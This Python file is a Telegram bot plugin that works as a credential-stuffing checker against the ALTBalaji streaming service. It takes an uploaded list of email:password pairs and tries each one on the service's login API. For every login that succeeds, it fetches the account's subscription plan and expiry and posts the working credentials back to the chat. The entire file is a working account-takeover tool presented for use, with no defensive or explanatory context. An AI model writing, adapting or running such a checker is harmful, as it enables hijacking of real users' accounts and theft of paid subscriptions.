import time
from pyrogram import Client
import requests
from requests.exceptions import ProxyError
import re
# import bs4
from pyrogram import Client, filters
import json

def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def isVip(token):
    url='https://payment.cloud.altbalaji.com/accounts/orders?limit=12&order_status=ok&domain=IN'
    headers = {
        'content-type': 'application/x-www-form-urlencoded',
        'xssession': token,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 FKUA/website/41/website/Desktop'
        }
    r = requests.get(url, headers=headers)
    exp = find_between(r.text, '"valid_to":"', '"')
    plan = find_between(r.text, '"default":"', '"')
    return exp, plan

def count_lines(filename):
    with open(filename, 'r') as f:
        return len(f.readlines())

@Client.on_message(filters.command(["alt", "make"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
async def gen(Client , message):
    try:
        if message.reply_to_message:
            if message.reply_to_message.document:
                if message.reply_to_message.document.file_name.endswith(".txt"):
                    await message.reply_to_message.download("accounts.txt")
                    msg = await message.reply_text("Downloading file...")
                    with open("downloads/accounts.txt", "r") as f:
                        le = count_lines("downloads/accounts.txt")
                        hits = 0
                        fails = 0
                        for i, line in enumerate(f, start=1):
                            if not line.strip():
                                break
                            else:
                                
                                email,password = line.split(":")
                                password = password.strip()
                                email = email.strip()
                                url = 'https://api.cloud.altbalaji.com/accounts/login?domain=IN'
                                payload = {
                                "username":email,
                                "password":password
                                }
                                headers = {
                                'content-type': 'application/json',
                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 FKUA/website/41/website/Desktop'
                                }
                                print(email+":"+password)
                                r = requests.post(url, data=json.dumps(payload), headers=headers)
                                if(r.status_code == 404):
                                    fails += 1
                                    print("Invalid credentials")
                                elif(r.status_code == 200):
                                    hits += 1
                                    print("Valid credentials")
                                    token = r.json()['session_token']
                                    exp, plan = isVip(token)
                                    await message.reply_text(f"Valid credentials found:{i} \n"+email+":"+password+"\nExpires: "+exp+"\nPlan: "+plan)
                                else:
                                    print("Unknown error")
                                    print(r.status_code)
                                msg = await msg.edit(f"<b>Combo Length: {le}\nChecking.. {i}/{le}| Hits: {hits}|Fails: {fails}</b>")
                    await message.reply_text("Checking Completed")
                    f.close()
                    #edit message
                else:
                    await message.reply_text("Please reply to a .txt file")
    except Exception as e:
        print(e)
